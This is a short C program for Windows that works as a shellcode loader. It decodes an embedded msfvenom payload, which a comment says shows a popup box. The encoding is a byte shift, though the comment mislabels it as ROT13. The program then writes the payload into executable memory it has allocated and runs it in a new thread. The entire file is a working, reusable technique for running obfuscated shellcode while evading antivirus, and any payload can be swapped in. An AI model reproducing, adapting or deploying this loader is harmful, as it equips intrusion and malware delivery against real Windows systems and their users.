//SHELLCODE USED HERE WAS GENERATED BY MSFVENOM AND WAS ENCRYPTED USING ROT13 (POPUP BOX)
#include <Windows.h>
#include <stdio.h>

void rot13_decrypt(unsigned char* data, size_t length) {
    for (int i = 0; i < length; ++i) {
        data[i] = data[i] - 13;
    }
}

int main(int argc, char** argv) {
    unsigned char encshellcode[] =
        "\xe6\xf8\xa8\xe6\x81\x31\x01\x3e\xdf\xbf\x84\x3e\xd6\x71\x98\x7e\x3d\x98\x83\x19\x98\x83\x29\x98\x53\x15\x98\x8b\x2d\x98\x43\x45\x5c\x25\x82\x00\x66\x0e\xde\x0c\xee\x6d\x98\x79\x31\x31\x98\x52\x49\x98\x61\x35\x85\x0e\xf7\x98\x57\x25\x98\x67\x2d\x0e\xf8\xf0\x41\x56\x98\x41\x98\x0e\xfb\x3e\x0c\x3e\xcd\x09\xb9\x91\xcd\x81\x14\xce\xdc\x1a\x0e\xd4\xf8\x01\x48\x89\x31\x35\x82\xee\x98\x67\x31\x0e\xf8\x73\x98\x19\x58\x98\x67\x29\x0e\xf8\x98\x11\x98\x0e\xf5\x96\x51\x31\x29\x6e\xd0\xbf\x15\x36\xe1\x96\xf2\x96\xcf\x75\x9b\x5b\x1b\xf9\x5f\xf5\xac\x0c\x0c\x0c\x96\x52\x11\xc8\x8b\xe5\xef\x80\x94\x29\x31\x5f\xf5\x9b\x0c\x0c\x0c\x96\x52\x15\x75\x79\x79\x2d\x4e\x75\x40\x3f\x3b\x71\x75\x82\x80\x72\x7f\x3d\xe8\x95\x69\x31\x17\x96\xf3\x63\x0c\x62\x11\x96\xcf\x5d\xc8\xb5\xaf\x5a\xc9\x94\x29\x31\x5f\xf5\x6c\x0c\x0c\x0c\x75\x7b\x65\x2d\x2d\x75\x79\x5c\x60\x72\x75\x60\x75\x72\x79\x3e\xe8\x95\x69\x31\x16\x96\xf0\x75\x7f\x65\x2d\x2d\x75\x72\x70\x81\x82\x75\x60\x72\x7b\x57\x75\x2d\x4f\x86\x2d\x75\x70\x81\x72\x71\x75\x56\x7b\x77\x72\x3e\xd6\x95\x59\x31\x22\x96\xee\x3e\xdf\x5f\x60\x5e\x5f\x0c\xdd\x3e\xcd\x5d\x0c\x62\x15";

    //decrypt shellcode
    size_t length = sizeof(encshellcode) - 1;
    rot13_decrypt(encshellcode, length);
    unsigned char* shellcode = (unsigned char*)malloc(length + 1);
    if (shellcode == NULL) {
        printf("Memory allocation failed.\n");
        return 1;
    }

    for (int i = 0; i < length; ++i) {
        shellcode[i] = encshellcode[i];
    }
    shellcode[length] = '\0';

    //1. allocate memory
    LPVOID mem_alloc = VirtualAlloc(NULL, length, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

    if (mem_alloc == NULL) {
        printf("Failed to allocate memory: %d\n", GetLastError());
        free(shellcode);
        return 1;
    }

    printf("Memory successfully allocated at address 0x%p\n", mem_alloc);

    //Copy and write shellcode to our allocated memory.
    RtlCopyMemory(mem_alloc, shellcode, length);
    printf("Shellcode written to allocated memory.(SUCCESS)\n");

    // Create thread to execute our shellcode
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem_alloc, NULL, 0, NULL);

    if (hThread == NULL) {
        printf("Failed to create Thread. SPE: %d\n", GetLastError());
        VirtualFree(mem_alloc, 0, MEM_RELEASE);
        free(shellcode);
        return 1;
    }

    //Wait until shellcode is finished execution
    WaitForSingleObject(hThread, INFINITE);

    //close handle
    CloseHandle(hThread);

    //Free that memory
    VirtualFree(mem_alloc, 0, MEM_RELEASE);
    free(shellcode);

    return 0;
}
